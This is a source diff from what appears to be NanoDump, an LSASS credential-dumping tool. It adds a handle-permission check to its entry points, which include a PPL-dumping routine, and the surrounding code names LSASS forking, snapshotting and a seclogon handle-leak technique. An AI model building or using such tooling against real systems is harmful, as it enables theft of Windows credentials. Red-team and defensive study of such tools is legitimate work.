@@ -163,6 +163,13 @@ void go(char* args, int length)
     if (!hProcess)
         goto cleanup;
 
+    success = check_handle_privs(hProcess, permissions);
+    if (!success)
+    {
+        PRINT_ERR("Could not open a handle with the requested permissions");
+        goto cleanup;
+    }
+
     // if malseclogon_leak was used, the handle does not have PROCESS_CREATE_PROCESS
     if ((fork_lsass || snapshot_lsass) &&
         (use_seclogon_leak_local || use_seclogon_leak_remote))
@@ -707,6 +714,13 @@ int main(int argc, char* argv[])
     if (!hProcess)
         goto cleanup;
 
+    success = check_handle_privs(hProcess, permissions);
+    if (!success)
+    {
+        PRINT_ERR("Could not open a handle with the requested permissions");
+        goto cleanup;
+    }
+
     // if malseclogon_leak was used, the handle does not have PROCESS_CREATE_PROCESS
     if ((fork_lsass || snapshot_lsass) &&
         (use_seclogon_leak_local || use_seclogon_leak_remote))
@@ -1079,6 +1093,13 @@ BOOL NanoDumpPPL(VOID)
         dump_path);
     if (!hProcess)
         goto cleanup;
+
+    success = check_handle_privs(hProcess, permissions);
+    if (!success)
+    {
+        PRINT_ERR("Could not open a handle with the requested permissions");
+        goto cleanup;
+    }
 
     // allocate a chuck of memory to write the dump
     region_size = DUMP_MAX_SIZE;
